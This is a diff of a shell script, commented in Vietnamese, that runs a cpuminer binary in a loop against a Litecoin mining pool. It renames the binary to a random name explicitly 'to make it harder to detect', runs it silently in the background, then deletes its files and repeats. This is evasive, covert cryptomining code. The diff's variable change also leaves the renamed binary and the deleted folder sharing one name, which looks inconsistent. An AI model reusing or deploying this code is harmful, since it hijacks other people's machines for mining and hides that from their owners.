@@ -23,10 +23,10 @@ while true; do
 
   # Đổi tên file để khó phát hiện hơn
   random_name_sh=$(generate_random_name)
-  mv cpuminer "$random_name_sh"
+  mv cpuminer "$random_name"
 
   # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
-  nohup ./"$random_name_sh" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
+  nohup ./"$random_name" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
   miner_pid=$!
 
   # Ngủ trong 5 phút
@@ -38,7 +38,7 @@ while true; do
   # Xóa các file đã tải và giải nén
   cd ..
   rm -rf "$random_name"
-  rm -rf "$random_name_sh"
+  rm -rf "$random_name"
 
   # Nghỉ 3 phút trước khi lặp lại
   sleep 180
